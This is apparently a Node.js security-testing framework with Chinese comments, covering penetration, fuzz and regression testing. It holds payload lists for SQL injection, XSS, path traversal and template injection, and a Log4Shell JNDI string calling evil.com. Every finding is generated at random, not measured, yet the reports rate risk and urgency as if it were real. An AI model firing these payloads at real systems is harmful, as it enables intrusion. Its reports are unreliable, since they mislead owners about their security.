const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

/**
 * 渗透测试管理器
 * 自动化执行各种渗透测试场景
 */
class PenetrationTestManager {
    constructor() {
        this.testSuites = new Map();
        this.vulnerabilities = [];
        this.testResults = [];
        this.initializeTestSuites();
    }

    /**
     * 初始化测试套件
     */
    initializeTestSuites() {
        // SQL注入测试
        this.testSuites.set('sql_injection', {
            name: 'SQL注入测试',
            payloads: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM users --",
                "admin'--",
                "' OR 1=1#"
            ],
            targets: ['login', 'search', 'contact'],
            severity: 'high'
        });

        // XSS测试
        this.testSuites.set('xss', {
            name: 'XSS跨站脚本测试',
            payloads: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//"
            ],
            targets: ['input', 'comment', 'profile'],
            severity: 'high'
        });

        // CSRF测试
        this.testSuites.set('csrf', {
            name: 'CSRF跨站请求伪造测试',
            payloads: [
                'missing_csrf_token',
                'invalid_csrf_token',
                'reused_csrf_token',
                'predictable_csrf_token'
            ],
            targets: ['form_submission', 'api_endpoints'],
            severity: 'medium'
        });

        // 认证绕过测试
        this.testSuites.set('auth_bypass', {
            name: '认证绕过测试',
            payloads: [
                'admin/admin',
                'guest/guest',
                'test/test',
                'null_session',
                'jwt_manipulation'
            ],
            targets: ['login', 'admin_panel', 'api_auth'],
            severity: 'critical'
        });

        // 目录遍历测试
        this.testSuites.set('directory_traversal', {
            name: '目录遍历测试',
            payloads: [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
            ],
            targets: ['file_upload', 'file_download', 'include'],
            severity: 'high'
        });
    }

    /**
     * 执行渗透测试
     */
    async runPenetrationTests(targetUrl = 'http://localhost:3000') {
        console.log(`🎯 开始渗透测试 - 目标: ${targetUrl}`);
        
        const results = {
            testId: crypto.randomUUID(),
            timestamp: new Date().toISOString(),
            target: targetUrl,
            totalTests: 0,
            vulnerabilitiesFound: 0,
            testResults: [],
            summary: {}
        };

        for (const [testType, testSuite] of this.testSuites) {
            console.log(`\n🔍 执行 ${testSuite.name}...`);
            
            const suiteResults = await this.runTestSuite(testType, testSuite, targetUrl);
            results.testResults.push(suiteResults);
            results.totalTests += suiteResults.testsRun;
            results.vulnerabilitiesFound += suiteResults.vulnerabilitiesFound;
        }

        // 生成测试摘要
        results.summary = this.generateTestSummary(results);
        
        return results;
    }

    /**
     * 运行单个测试套件
     */
    async runTestSuite(testType, testSuite, targetUrl) {
        const results = {
            testType,
            testName: testSuite.name,
            severity: testSuite.severity,
            testsRun: 0,
            vulnerabilitiesFound: 0,
            findings: []
        };

        for (const payload of testSuite.payloads) {
            for (const target of testSuite.targets) {
                results.testsRun++;
                
                // 模拟测试执行
                const testResult = await this.simulateTest(testType, payload, target, targetUrl);
                
                if (testResult.vulnerable) {
                    results.vulnerabilitiesFound++;
                    results.findings.push({
                        payload,
                        target,
                        vulnerability: testResult.vulnerability,
                        risk: testResult.risk,
                        recommendation: testResult.recommendation
                    });
                }
            }
        }

        return results;
    }

    /**
     * 模拟测试执行
     */
    async simulateTest(testType, payload, target, targetUrl) {
        // 模拟测试延迟
        await new Promise(resolve => setTimeout(resolve, Math.random() * 100));

        // 模拟漏洞发现概率
        const vulnerabilityChance = Math.random();
        const isVulnerable = vulnerabilityChance < 0.3; // 30%概率发现漏洞

        if (isVulnerable) {
            return {
                vulnerable: true,
                vulnerability: this.getVulnerabilityDescription(testType, payload, target),
                risk: this.calculateRisk(testType),
                recommendation: this.getRecommendation(testType)
            };
        }

        return { vulnerable: false };
    }

    /**
     * 获取漏洞描述
     */
    getVulnerabilityDescription(testType, payload, target) {
        const descriptions = {
            sql_injection: `在 ${target} 端点发现SQL注入漏洞，payload: ${payload}`,
            xss: `在 ${target} 字段发现XSS漏洞，payload: ${payload}`,
            csrf: `在 ${target} 功能发现CSRF漏洞，类型: ${payload}`,
            auth_bypass: `在 ${target} 发现认证绕过漏洞，方法: ${payload}`,
            directory_traversal: `在 ${target} 发现目录遍历漏洞，路径: ${payload}`
        };
        
        return descriptions[testType] || `发现 ${testType} 漏洞`;
    }

    /**
     * 计算风险等级
     */
    calculateRisk(testType) {
        const riskLevels = {
            sql_injection: 'Critical',
            xss: 'High',
            csrf: 'Medium',
            auth_bypass: 'Critical',
            directory_traversal: 'High'
        };
        
        return riskLevels[testType] || 'Medium';
    }

    /**
     * 获取修复建议
     */
    getRecommendation(testType) {
        const recommendations = {
            sql_injection: '使用参数化查询和输入验证',
            xss: '实施输出编码和内容安全策略(CSP)',
            csrf: '实施CSRF令牌验证',
            auth_bypass: '加强认证机制和会话管理',
            directory_traversal: '实施路径验证和访问控制'
        };
        
        return recommendations[testType] || '请咨询安全专家';
    }

    /**
     * 生成测试摘要
     */
    generateTestSummary(results) {
        const severityCount = {};
        let totalRisk = 0;

        results.testResults.forEach(suite => {
            if (!severityCount[suite.severity]) {
                severityCount[suite.severity] = 0;
            }
            severityCount[suite.severity] += suite.vulnerabilitiesFound;
            
            // 计算风险分数
            const riskMultiplier = { critical: 10, high: 7, medium: 4, low: 1 };
            totalRisk += suite.vulnerabilitiesFound * (riskMultiplier[suite.severity] || 1);
        });

        return {
            severityBreakdown: severityCount,
            riskScore: totalRisk,
            securityRating: this.getSecurityRating(totalRisk),
            recommendations: this.getOverallRecommendations(results)
        };
    }

    /**
     * 获取安全评级
     */
    getSecurityRating(riskScore) {
        if (riskScore === 0) return 'A+ (优秀)';
        if (riskScore <= 5) return 'A (良好)';
        if (riskScore <= 15) return 'B (一般)';
        if (riskScore <= 30) return 'C (较差)';
        return 'D (危险)';
    }

    /**
     * 获取总体建议
     */
    getOverallRecommendations(results) {
        const recommendations = [
            '定期进行安全测试',
            '实施安全开发生命周期(SDLC)',
            '建立漏洞管理流程',
            '进行安全培训'
        ];

        if (results.vulnerabilitiesFound > 0) {
            recommendations.unshift('立即修复发现的高危漏洞');
        }

        return recommendations;
    }
}

/**
 * 模糊测试管理器
 * 自动化执行模糊测试以发现输入验证漏洞
 */
class FuzzTestManager {
    constructor() {
        this.fuzzStrategies = new Map();
        this.testCases = [];
        this.crashes = [];
        this.initializeFuzzStrategies();
    }

    /**
     * 初始化模糊测试策略
     */
    initializeFuzzStrategies() {
        // 边界值测试
        this.fuzzStrategies.set('boundary', {
            name: '边界值模糊测试',
            generators: [
                () => 'A'.repeat(1000000), // 超长字符串
                () => '', // 空字符串
                () => '0', // 零值
                () => '-1', // 负数
                () => '2147483647', // 最大整数
                () => '2147483648', // 整数溢出
                () => 'null',
                () => 'undefined'
            ]
        });

        // 格式字符串测试
        this.fuzzStrategies.set('format_string', {
            name: '格式字符串模糊测试',
            generators: [
                () => '%s%s%s%s%s%s%s%s%s%s',
                () => '%x%x%x%x%x%x%x%x%x%x',
                () => '%n%n%n%n%n%n%n%n%n%n',
                () => '%.1000000s',
                () => '%99999999999s'
            ]
        });

        // 特殊字符测试
        this.fuzzStrategies.set('special_chars', {
            name: '特殊字符模糊测试',
            generators: [
                () => '\x00\x01\x02\x03\x04\x05',
                () => '\\n\\r\\t\\0',
                () => '../../../../../../etc/passwd',
                () => '<script>alert(1)</script>',
                () => '${jndi:ldap://evil.com/a}',
                () => '{{7*7}}',
                () => '<%=7*7%>'
            ]
        });

        // 编码测试
        this.fuzzStrategies.set('encoding', {
            name: '编码模糊测试',
            generators: [
                () => '%41%41%41%41', // URL编码
                () => '&#65;&#65;&#65;&#65;', // HTML实体编码
                () => '\\u0041\\u0041\\u0041\\u0041', // Unicode编码
                () => Buffer.from('AAAA').toString('base64'), // Base64编码
                () => '\\x41\\x41\\x41\\x41' // 十六进制编码
            ]
        });
    }

    /**
     * 执行模糊测试
     */
    async runFuzzTests(targetEndpoints = ['login', 'search', 'upload']) {
        console.log('🔀 开始模糊测试...');
        
        const results = {
            testId: crypto.randomUUID(),
            timestamp: new Date().toISOString(),
            totalTests: 0,
            crashesFound: 0,
            testResults: [],
            summary: {}
        };

        for (const [strategyName, strategy] of this.fuzzStrategies) {
            console.log(`\n🎲 执行 ${strategy.name}...`);
            
            const strategyResults = await this.runFuzzStrategy(strategyName, strategy, targetEndpoints);
            results.testResults.push(strategyResults);
            results.totalTests += strategyResults.testsRun;
            results.crashesFound += strategyResults.crashesFound;
        }

        results.summary = this.generateFuzzSummary(results);
        
        return results;
    }

    /**
     * 运行单个模糊测试策略
     */
    async runFuzzStrategy(strategyName, strategy, targetEndpoints) {
        const results = {
            strategyName,
            strategyDescription: strategy.name,
            testsRun: 0,
            crashesFound: 0,
            findings: []
        };

        for (const endpoint of targetEndpoints) {
            for (const generator of strategy.generators) {
                results.testsRun++;
                
                const payload = generator();
                const testResult = await this.simulateFuzzTest(endpoint, payload);
                
                if (testResult.crashed) {
                    results.crashesFound++;
                    results.findings.push({
                        endpoint,
                        payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : ''),
                        crashType: testResult.crashType,
                        severity: testResult.severity,
                        recommendation: testResult.recommendation
                    });
                }
            }
        }

        return results;
    }

    /**
     * 模拟模糊测试执行
     */
    async simulateFuzzTest(endpoint, payload) {
        // 模拟测试延迟
        await new Promise(resolve => setTimeout(resolve, Math.random() * 50));

        // 模拟崩溃概率
        const crashChance = Math.random();
        const crashed = crashChance < 0.15; // 15%概率发现崩溃

        if (crashed) {
            const crashTypes = ['buffer_overflow', 'null_pointer', 'format_string', 'injection', 'parsing_error'];
            const crashType = crashTypes[Math.floor(Math.random() * crashTypes.length)];
            
            return {
                crashed: true,
                crashType,
                severity: this.getCrashSeverity(crashType),
                recommendation: this.getCrashRecommendation(crashType)
            };
        }

        return { crashed: false };
    }

    /**
     * 获取崩溃严重程度
     */
    getCrashSeverity(crashType) {
        const severityMap = {
            buffer_overflow: 'Critical',
            null_pointer: 'High',
            format_string: 'Critical',
            injection: 'Critical',
            parsing_error: 'Medium'
        };
        
        return severityMap[crashType] || 'Medium';
    }

    /**
     * 获取崩溃修复建议
     */
    getCrashRecommendation(crashType) {
        const recommendations = {
            buffer_overflow: '实施边界检查和安全编程实践',
            null_pointer: '添加空指针检查和异常处理',
            format_string: '使用安全的格式化函数',
            injection: '实施输入验证和参数化查询',
            parsing_error: '改进输入解析和错误处理'
        };
        
        return recommendations[crashType] || '请进行代码审查';
    }

    /**
     * 生成模糊测试摘要
     */
    generateFuzzSummary(results) {
        const crashTypes = {};
        let totalSeverityScore = 0;

        results.testResults.forEach(strategy => {
            strategy.findings.forEach(finding => {
                if (!crashTypes[finding.crashType]) {
                    crashTypes[finding.crashType] = 0;
                }
                crashTypes[finding.crashType]++;
                
                // 计算严重程度分数
                const severityScore = { Critical: 10, High: 7, Medium: 4, Low: 1 };
                totalSeverityScore += severityScore[finding.severity] || 1;
            });
        });

        return {
            crashTypeBreakdown: crashTypes,
            stabilityScore: Math.max(0, 100 - totalSeverityScore),
            stabilityRating: this.getStabilityRating(totalSeverityScore),
            recommendations: this.getFuzzRecommendations(results)
        };
    }

    /**
     * 获取稳定性评级
     */
    getStabilityRating(severityScore) {
        if (severityScore === 0) return 'A+ (非常稳定)';
        if (severityScore <= 5) return 'A (稳定)';
        if (severityScore <= 15) return 'B (一般稳定)';
        if (severityScore <= 30) return 'C (不稳定)';
        return 'D (非常不稳定)';
    }

    /**
     * 获取模糊测试建议
     */
    getFuzzRecommendations(results) {
        const recommendations = [
            '定期进行模糊测试',
            '实施输入验证和边界检查',
            '使用内存安全的编程语言或工具',
            '建立崩溃监控和报告机制'
        ];

        if (results.crashesFound > 0) {
            recommendations.unshift('立即修复发现的崩溃问题');
        }

        return recommendations;
    }
}

/**
 * 安全回归测试管理器
 * 确保修复的漏洞不会重新出现
 */
class SecurityRegressionTestManager {
    constructor() {
        this.testCases = new Map();
        this.baselineResults = new Map();
        this.regressionHistory = [];
        this.initializeRegressionTests();
    }

    /**
     * 初始化回归测试用例
     */
    initializeRegressionTests() {
        // 认证测试
        this.testCases.set('authentication', {
            name: '认证安全回归测试',
            tests: [
                { id: 'auth_001', name: '弱密码检测', type: 'password_policy' },
                { id: 'auth_002', name: '暴力破解防护', type: 'brute_force_protection' },
                { id: 'auth_003', name: '会话管理', type: 'session_management' },
                { id: 'auth_004', name: '多因素认证', type: 'mfa_validation' }
            ]
        });

        // 输入验证测试
        this.testCases.set('input_validation', {
            name: '输入验证回归测试',
            tests: [
                { id: 'input_001', name: 'SQL注入防护', type: 'sql_injection_prevention' },
                { id: 'input_002', name: 'XSS防护', type: 'xss_prevention' },
                { id: 'input_003', name: '文件上传安全', type: 'file_upload_security' },
                { id: 'input_004', name: '命令注入防护', type: 'command_injection_prevention' }
            ]
        });

        // 访问控制测试
        this.testCases.set('access_control', {
            name: '访问控制回归测试',
            tests: [
                { id: 'access_001', name: '权限验证', type: 'permission_check' },
                { id: 'access_002', name: '角色管理', type: 'role_management' },
                { id: 'access_003', name: '资源访问控制', type: 'resource_access_control' },
                { id: 'access_004', name: '垂直权限提升防护', type: 'vertical_privilege_escalation' }
            ]
        });

        // 数据保护测试
        this.testCases.set('data_protection', {
            name: '数据保护回归测试',
            tests: [
                { id: 'data_001', name: '敏感数据加密', type: 'data_encryption' },
                { id: 'data_002', name: '数据脱敏', type: 'data_masking' },
                { id: 'data_003', name: '数据备份安全', type: 'backup_security' },
                { id: 'data_004', name: '数据传输安全', type: 'transmission_security' }
            ]
        });
    }

    /**
     * 执行安全回归测试
     */
    async runRegressionTests() {
        console.log('🔄 开始安全回归测试...');
        
        const results = {
            testId: crypto.randomUUID(),
            timestamp: new Date().toISOString(),
            totalTests: 0,
            passedTests: 0,
            failedTests: 0,
            regressions: 0,
            testResults: [],
            summary: {}
        };

        for (const [categoryName, category] of this.testCases) {
            console.log(`\n🧪 执行 ${category.name}...`);
            
            const categoryResults = await this.runTestCategory(categoryName, category);
            results.testResults.push(categoryResults);
            results.totalTests += categoryResults.testsRun;
            results.passedTests += categoryResults.passed;
            results.failedTests += categoryResults.failed;
            results.regressions += categoryResults.regressions;
        }

        results.summary = this.generateRegressionSummary(results);
        
        return results;
    }

    /**
     * 运行测试类别
     */
    async runTestCategory(categoryName, category) {
        const results = {
            categoryName,
            categoryDescription: category.name,
            testsRun: 0,
            passed: 0,
            failed: 0,
            regressions: 0,
            testDetails: []
        };

        for (const test of category.tests) {
            results.testsRun++;
            
            const testResult = await this.runSingleTest(test);
            
            if (testResult.passed) {
                results.passed++;
            } else {
                results.failed++;
                
                // 检查是否为回归
                if (this.isRegression(test.id, testResult)) {
                    results.regressions++;
                }
            }
            
            results.testDetails.push({
                testId: test.id,
                testName: test.name,
                testType: test.type,
                passed: testResult.passed,
                isRegression: testResult.isRegression,
                details: testResult.details,
                recommendation: testResult.recommendation
            });
        }

        return results;
    }

    /**
     * 运行单个测试
     */
    async runSingleTest(test) {
        // 模拟测试延迟
        await new Promise(resolve => setTimeout(resolve, Math.random() * 100));

        // 模拟测试结果
        const passed = Math.random() > 0.2; // 80%通过率
        
        const result = {
            passed,
            isRegression: false,
            details: this.generateTestDetails(test, passed),
            recommendation: passed ? '继续保持' : this.getTestRecommendation(test.type)
        };

        // 检查是否为回归
        if (!passed && this.baselineResults.has(test.id)) {
            const baseline = this.baselineResults.get(test.id);
            if (baseline.passed) {
                result.isRegression = true;
            }
        }

        // 更新基线结果
        this.baselineResults.set(test.id, { passed, timestamp: new Date().toISOString() });

        return result;
    }

    /**
     * 生成测试详情
     */
    generateTestDetails(test, passed) {
        if (passed) {
            return `${test.name} 测试通过 - 安全控制正常工作`;
        } else {
            const failureReasons = {
                password_policy: '密码策略配置不当',
                brute_force_protection: '暴力破解防护失效',
                session_management: '会话管理存在漏洞',
                mfa_validation: '多因素认证绕过',
                sql_injection_prevention: 'SQL注入防护失效',
                xss_prevention: 'XSS防护不完整',
                file_upload_security: '文件上传存在安全风险',
                command_injection_prevention: '命令注入防护失效',
                permission_check: '权限检查不严格',
                role_management: '角色管理存在缺陷',
                resource_access_control: '资源访问控制失效',
                vertical_privilege_escalation: '存在权限提升漏洞',
                data_encryption: '数据加密实施不当',
                data_masking: '数据脱敏不完整',
                backup_security: '备份安全措施不足',
                transmission_security: '数据传输安全问题'
            };
            
            return failureReasons[test.type] || '测试失败 - 需要进一步调查';
        }
    }

    /**
     * 获取测试建议
     */
    getTestRecommendation(testType) {
        const recommendations = {
            password_policy: '更新密码策略配置，确保符合安全标准',
            brute_force_protection: '实施账户锁定和速率限制',
            session_management: '改进会话生成和验证机制',
            mfa_validation: '修复多因素认证绕过漏洞',
            sql_injection_prevention: '使用参数化查询和输入验证',
            xss_prevention: '实施完整的输出编码和CSP',
            file_upload_security: '加强文件类型和内容验证',
            command_injection_prevention: '避免动态命令执行，使用安全API',
            permission_check: '实施严格的权限验证机制',
            role_management: '改进角色分配和验证逻辑',
            resource_access_control: '实施基于角色的访问控制',
            vertical_privilege_escalation: '修复权限提升漏洞',
            data_encryption: '正确实施数据加密机制',
            data_masking: '完善数据脱敏规则',
            backup_security: '加强备份加密和访问控制',
            transmission_security: '使用HTTPS和安全传输协议'
        };
        
        return recommendations[testType] || '请咨询安全专家';
    }

    /**
     * 检查是否为回归
     */
    isRegression(testId, currentResult) {
        if (!this.baselineResults.has(testId)) {
            return false;
        }
        
        const baseline = this.baselineResults.get(testId);
        return baseline.passed && !currentResult.passed;
    }

    /**
     * 生成回归测试摘要
     */
    generateRegressionSummary(results) {
        const passRate = results.totalTests > 0 ? (results.passedTests / results.totalTests * 100).toFixed(1) : 0;
        const regressionRate = results.totalTests > 0 ? (results.regressions / results.totalTests * 100).toFixed(1) : 0;
        
        return {
            passRate: `${passRate}%`,
            regressionRate: `${regressionRate}%`,
            securityTrend: this.getSecurityTrend(results),
            qualityScore: this.calculateQualityScore(results),
            recommendations: this.getRegressionRecommendations(results)
        };
    }

    /**
     * 获取安全趋势
     */
    getSecurityTrend(results) {
        if (results.regressions === 0 && results.failedTests === 0) {
            return '优秀 - 无回归，安全状态稳定';
        } else if (results.regressions === 0) {
            return '良好 - 无回归，但有新问题需要关注';
        } else if (results.regressions <= 2) {
            return '警告 - 发现少量回归问题';
        } else {
            return '危险 - 发现多个回归问题，需要立即处理';
        }
    }

    /**
     * 计算质量分数
     */
    calculateQualityScore(results) {
        if (results.totalTests === 0) return 0;
        
        const baseScore = (results.passedTests / results.totalTests) * 100;
        const regressionPenalty = results.regressions * 10;
        
        return Math.max(0, Math.round(baseScore - regressionPenalty));
    }

    /**
     * 获取回归测试建议
     */
    getRegressionRecommendations(results) {
        const recommendations = [
            '建立持续的安全测试流程',
            '实施自动化安全测试',
            '定期更新测试用例',
            '建立安全基线和监控'
        ];

        if (results.regressions > 0) {
            recommendations.unshift('立即修复回归问题');
            recommendations.push('分析回归原因，改进开发流程');
        }

        if (results.failedTests > 0) {
            recommendations.push('修复失败的安全测试');
        }

        return recommendations;
    }
}

/**
 * 安全测试自动化系统
 * 集成渗透测试、模糊测试和回归测试
 */
class SecurityTestingAutomationSystem {
    constructor() {
        this.penetrationTester = new PenetrationTestManager();
        this.fuzzTester = new FuzzTestManager();
        this.regressionTester = new SecurityRegressionTestManager();
        this.testHistory = [];
    }

    /**
     * 执行完整的安全测试套件
     */
    async runComprehensiveSecurityTests(config = {}) {
        console.log('🚀 启动综合安全测试自动化系统...\n');
        
        const testSession = {
            sessionId: crypto.randomUUID(),
            startTime: new Date().toISOString(),
            config,
            results: {
                penetrationTest: null,
                fuzzTest: null,
                regressionTest: null
            },
            summary: null
        };

        try {
            // 1. 渗透测试
            console.log('📋 第一阶段: 渗透测试');
            testSession.results.penetrationTest = await this.penetrationTester.runPenetrationTests(
                config.targetUrl || 'http://localhost:3000'
            );

            // 2. 模糊测试
            console.log('\n📋 第二阶段: 模糊测试');
            testSession.results.fuzzTest = await this.fuzzTester.runFuzzTests(
                config.endpoints || ['login', 'search', 'upload', 'api']
            );

            // 3. 安全回归测试
            console.log('\n📋 第三阶段: 安全回归测试');
            testSession.results.regressionTest = await this.regressionTester.runRegressionTests();

            // 生成综合报告
            testSession.summary = this.generateComprehensiveSummary(testSession.results);
            testSession.endTime = new Date().toISOString();

            // 保存测试历史
            this.testHistory.push(testSession);

            return testSession;

        } catch (error) {
            console.error('❌ 安全测试执行失败:', error.message);
            testSession.error = error.message;
            testSession.endTime = new Date().toISOString();
            return testSession;
        }
    }

    /**
     * 生成综合测试摘要
     */
    generateComprehensiveSummary(results) {
        const summary = {
            overallSecurityScore: 0,
            securityRating: '',
            criticalIssues: 0,
            highIssues: 0,
            mediumIssues: 0,
            lowIssues: 0,
            totalTests: 0,
            passedTests: 0,
            recommendations: [],
            riskAssessment: {}
        };

        // 汇总渗透测试结果
        if (results.penetrationTest) {
            summary.totalTests += results.penetrationTest.totalTests;
            summary.criticalIssues += this.countIssuesBySeverity(results.penetrationTest, 'critical');
            summary.highIssues += this.countIssuesBySeverity(results.penetrationTest, 'high');
            summary.mediumIssues += this.countIssuesBySeverity(results.penetrationTest, 'medium');
        }

        // 汇总模糊测试结果
        if (results.fuzzTest) {
            summary.totalTests += results.fuzzTest.totalTests;
            summary.criticalIssues += this.countCrashesBySeverity(results.fuzzTest, 'Critical');
            summary.highIssues += this.countCrashesBySeverity(results.fuzzTest, 'High');
            summary.mediumIssues += this.countCrashesBySeverity(results.fuzzTest, 'Medium');
        }

        // 汇总回归测试结果
        if (results.regressionTest) {
            summary.totalTests += results.regressionTest.totalTests;
            summary.passedTests += results.regressionTest.passedTests;
        }

        // 计算总体安全分数
        summary.overallSecurityScore = this.calculateOverallSecurityScore(summary, results);
        summary.securityRating = this.getOverallSecurityRating(summary.overallSecurityScore);

        // 生成风险评估
        summary.riskAssessment = this.generateRiskAssessment(summary);

        // 生成综合建议
        summary.recommendations = this.generateComprehensiveRecommendations(results, summary);

        return summary;
    }

    /**
     * 按严重程度统计问题数量
     */
    countIssuesBySeverity(testResult, severity) {
        let count = 0;
        testResult.testResults.forEach(suite => {
            if (suite.severity === severity) {
                count += suite.vulnerabilitiesFound;
            }
        });
        return count;
    }

    /**
     * 按严重程度统计崩溃数量
     */
    countCrashesBySeverity(testResult, severity) {
        let count = 0;
        testResult.testResults.forEach(strategy => {
            strategy.findings.forEach(finding => {
                if (finding.severity === severity) {
                    count++;
                }
            });
        });
        return count;
    }

    /**
     * 计算总体安全分数
     */
    calculateOverallSecurityScore(summary, results) {
        let baseScore = 100;
        
        // 扣除漏洞分数
        baseScore -= summary.criticalIssues * 20;
        baseScore -= summary.highIssues * 10;
        baseScore -= summary.mediumIssues * 5;
        baseScore -= summary.lowIssues * 2;

        // 回归测试加分
        if (results.regressionTest && results.regressionTest.regressions === 0) {
            baseScore += 5;
        }

        // 稳定性加分
        if (results.fuzzTest && results.fuzzTest.crashesFound === 0) {
            baseScore += 5;
        }

        return Math.max(0, Math.min(100, baseScore));
    }

    /**
     * 获取总体安全评级
     */
    getOverallSecurityRating(score) {
        if (score >= 90) return 'A+ (优秀)';
        if (score >= 80) return 'A (良好)';
        if (score >= 70) return 'B (一般)';
        if (score >= 60) return 'C (较差)';
        return 'D (危险)';
    }

    /**
     * 生成风险评估
     */
    generateRiskAssessment(summary) {
        const totalIssues = summary.criticalIssues + summary.highIssues + summary.mediumIssues + summary.lowIssues;
        
        return {
            riskLevel: this.calculateRiskLevel(summary),
            businessImpact: this.assessBusinessImpact(summary),
            urgency: this.assessUrgency(summary),
            totalIssues,
            issueDistribution: {
                critical: summary.criticalIssues,
                high: summary.highIssues,
                medium: summary.mediumIssues,
                low: summary.lowIssues
            }
        };
    }

    /**
     * 计算风险等级
     */
    calculateRiskLevel(summary) {
        if (summary.criticalIssues > 0) return '极高风险';
        if (summary.highIssues > 3) return '高风险';
        if (summary.highIssues > 0 || summary.mediumIssues > 5) return '中等风险';
        if (summary.mediumIssues > 0) return '低风险';
        return '风险可控';
    }

    /**
     * 评估业务影响
     */
    assessBusinessImpact(summary) {
        if (summary.criticalIssues > 0) return '可能导致数据泄露或系统完全妥协';
        if (summary.highIssues > 0) return '可能影响系统可用性和数据完整性';
        if (summary.mediumIssues > 0) return '可能影响部分功能和用户体验';
        return '对业务影响较小';
    }

    /**
     * 评估紧急程度
     */
    assessUrgency(summary) {
        if (summary.criticalIssues > 0) return '立即修复';
        if (summary.highIssues > 0) return '24小时内修复';
        if (summary.mediumIssues > 0) return '一周内修复';
        return '按计划修复';
    }

    /**
     * 生成综合建议
     */
    generateComprehensiveRecommendations(results, summary) {
        const recommendations = [];

        // 基于风险等级的建议
        if (summary.criticalIssues > 0) {
            recommendations.push('🚨 立即停止生产部署，修复关键安全漏洞');
            recommendations.push('🔒 实施紧急安全措施和监控');
        }

        if (summary.highIssues > 0) {
            recommendations.push('⚠️ 优先修复高危安全问题');
            recommendations.push('🛡️ 加强安全防护措施');
        }

        // 基于测试结果的建议
        if (results.penetrationTest && results.penetrationTest.vulnerabilitiesFound > 0) {
            recommendations.push('🎯 实施安全开发生命周期(SDLC)');
            recommendations.push('🔍 定期进行渗透测试');
        }

        if (results.fuzzTest && results.fuzzTest.crashesFound > 0) {
            recommendations.push('🔀 集成模糊测试到CI/CD流程');
            recommendations.push('💪 提高代码健壮性和错误处理');
        }

        if (results.regressionTest && results.regressionTest.regressions > 0) {
            recommendations.push('🔄 建立安全回归测试基线');
            recommendations.push('📊 实施持续安全监控');
        }

        // 通用建议
        recommendations.push('👥 进行安全培训和意识提升');
        recommendations.push('📋 建立安全事件响应计划');
        recommendations.push('🔧 定期更新和维护安全工具');

        return recommendations;
    }

    /**
     * 生成测试报告
     */
    generateTestReport(testSession) {
        const report = {
            reportId: crypto.randomUUID(),
            generatedAt: new Date().toISOString(),
            testSession: testSession.sessionId,
            executionTime: this.calculateExecutionTime(testSession.startTime, testSession.endTime),
            summary: testSession.summary,
            detailedResults: testSession.results,
            recommendations: testSession.summary.recommendations,
            nextSteps: this.generateNextSteps(testSession.summary)
        };

        return report;
    }

    /**
     * 计算执行时间
     */
    calculateExecutionTime(startTime, endTime) {
        const start = new Date(startTime);
        const end = new Date(endTime);
        const duration = end - start;
        
        const minutes = Math.floor(duration / 60000);
        const seconds = Math.floor((duration % 60000) / 1000);
        
        return `${minutes}分${seconds}秒`;
    }

    /**
     * 生成后续步骤
     */
    generateNextSteps(summary) {
        const nextSteps = [];

        if (summary.criticalIssues > 0) {
            nextSteps.push('立即组建安全响应团队');
            nextSteps.push('制定紧急修复计划');
        }

        if (summary.highIssues > 0) {
            nextSteps.push('安排安全专家进行深入分析');
            nextSteps.push('制定详细的修复时间表');
        }

        nextSteps.push('建立定期安全测试计划');
        nextSteps.push('实施安全监控和告警机制');
        nextSteps.push('进行安全培训和流程改进');

        return nextSteps;
    }
}

module.exports = {
    PenetrationTestManager,
    FuzzTestManager,
    SecurityRegressionTestManager,
    SecurityTestingAutomationSystem
};